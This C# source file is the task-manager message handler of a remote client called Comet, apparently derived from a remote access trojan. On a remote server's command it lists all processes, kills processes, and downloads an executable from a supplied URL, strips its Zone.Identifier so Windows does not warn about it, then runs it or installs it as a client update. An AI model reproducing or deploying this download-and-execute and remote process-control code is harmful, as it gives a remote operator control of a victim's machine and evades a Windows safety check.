﻿using MySystemIcon;
using Comet.Client.Networking;
using Comet.Client.Setup;
using Comet.Common;
using Comet.Common.Enums;
using Comet.Common.Helpers;
using Comet.Common.Messages;
using Comet.Common.Networking;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Threading;
using System.Xml.Linq;
using System.Management;

namespace Comet.Client.Messages
{
    /// <summary>
    /// Handles messages for the interaction with tasks.
    /// </summary>
    public class TaskManagerHandler : IMessageProcessor, IDisposable
    {
        private readonly CometClient _client;

        private readonly WebClient _webClient;

        public TaskManagerHandler(CometClient client)
        {
            _client = client;
            _client.ClientState += OnClientStateChange;
            _webClient = new WebClient { Proxy = null };
            _webClient.DownloadFileCompleted += OnDownloadFileCompleted;
        }

        private void OnClientStateChange(Networking.Client s, bool connected)
        {
            if (!connected)
            {
                if (_webClient.IsBusy)
                    _webClient.CancelAsync();
            }
        }

        public bool CanExecute(IMessage message) => message is GetProcesses ||
                                                             message is DoProcessStart ||
                                                             message is DoProcessEnd;

        public bool CanExecuteFrom(ISender sender) => true;

        public void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case GetProcesses msg:
                    Execute(sender, msg);
                    break;
                case DoProcessStart msg:
                    Execute(sender, msg);
                    break;
                case DoProcessEnd msg:
                    Execute(sender, msg);
                    break;
            }
        }

        private void Execute(ISender client, GetProcesses message)
        {
            Process[] pList = Process.GetProcesses();
            var processes = new Common.Models.Process[pList.Length];

            for (int i = 0; i < pList.Length; i++)
            {
                try
                {
                    var process = new Common.Models.Process
                    {
                        Name = pList[i].ProcessName + ".exe",
                        Id = pList[i].Id,
                        MainWindowTitle = pList[i].MainWindowTitle,
                        Path = pList[i].MainModule.FileName,
                        Description= pList[i].MainModule.FileVersionInfo.FileDescription,
                        SessionId = pList[i].SessionId,
                    };

                    Bitmap bmpIcon = GetSystemIconA.GetIconFromFile(pList[i].MainModule.FileName, GetSystemIconA.IMAGELIST_SIZE_FLAG.SHIL_SMALL).ToBitmap();
                    using (MemoryStream ms = new MemoryStream())
                    {
                        bmpIcon.Save(ms, ImageFormat.Png);
                        process.Ico = ms.ToArray();
                    }
                    processes[i] = process;
                }
                catch (Exception)
                {
                    //throw;
                }
                
            }

            client.Send(new GetProcessesResponse { Processes = processes });
        }

        /// <summary>
        /// 通过pid获取用户名
        /// </summary>
        /// <param name="processId"></param>
        /// <returns></returns>
        public string getProcessOwnerName(int processId)
        {
            var processes = new ManagementObjectSearcher("SELECT * FROM Win32_Process WHERE ProcessId = " + processId);
            foreach (ManagementObject process in processes.Get())
            {
                try
                {
                    string[] OwnerInfo = new string[2];
                    process.InvokeMethod("GetOwner", (object[])OwnerInfo);
                    return OwnerInfo[0];
                }
                catch
                {
                    return string.Empty;
                }
            }

            return string.Empty;
        }

        private void Execute(ISender client, DoProcessStart message)
        {
            if (string.IsNullOrEmpty(message.FilePath))
            {
                // download and then execute
                if (string.IsNullOrEmpty(message.DownloadUrl))
                {
                    client.Send(new DoProcessResponse {Action = ProcessAction.Start, Result = false});
                    return;
                }

                message.FilePath = FileHelper.GetTempFilePath(".exe");

                try
                {
                    if (_webClient.IsBusy)
                    {
                        _webClient.CancelAsync();
                        while (_webClient.IsBusy)
                        {
                            Thread.Sleep(50);
                        }
                    }

                    _webClient.DownloadFileAsync(new Uri(message.DownloadUrl), message.FilePath, message);
                }
                catch
                {
                    client.Send(new DoProcessResponse {Action = ProcessAction.Start, Result = false});
                    NativeMethods.DeleteFile(message.FilePath);
                }
            }
            else
            {
                // execute locally
                ExecuteProcess(message.FilePath, message.IsUpdate);
            }
        }

        private void OnDownloadFileCompleted(object sender, AsyncCompletedEventArgs e)
        {
            var message = (DoProcessStart) e.UserState;
            if (e.Cancelled)
            {
                NativeMethods.DeleteFile(message.FilePath);
                return;
            }

            FileHelper.DeleteZoneIdentifier(message.FilePath);
            ExecuteProcess(message.FilePath, message.IsUpdate);
        }

        private void ExecuteProcess(string filePath, bool isUpdate)
        {
            if (isUpdate)
            {
                try
                {
                    var clientUpdater = new ClientUpdater();
                    clientUpdater.Update(filePath);
                    _client.Exit();
                }
                catch (Exception ex)
                {
                    NativeMethods.DeleteFile(filePath);
                    _client.Send(new SetStatus { Message = $"Update failed: {ex.Message}" });
                }
            }
            else
            {
                try
                {
                    ProcessStartInfo startInfo = new ProcessStartInfo
                    {
                        UseShellExecute = true,
                        FileName = filePath
                    };
                    Process.Start(startInfo);
                    _client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = true });
                }
                catch (Exception)
                {
                    _client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = false });
                }

            }
        }

        private void Execute(ISender client, DoProcessEnd message)
        {
            try
            {
                Process.GetProcessById(message.Pid).Kill();
                client.Send(new DoProcessResponse { Action = ProcessAction.End, Result = true });
            }
            catch
            {
                client.Send(new DoProcessResponse { Action = ProcessAction.End, Result = false });
            }
        }

        /// <summary>
        /// Disposes all managed and unmanaged resources associated with this message processor.
        /// </summary>
        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposing)
            {
                _client.ClientState -= OnClientStateChange;
                _webClient.DownloadFileCompleted -= OnDownloadFileCompleted;
                _webClient.CancelAsync();
                _webClient.Dispose();
            }
        }
    }
}
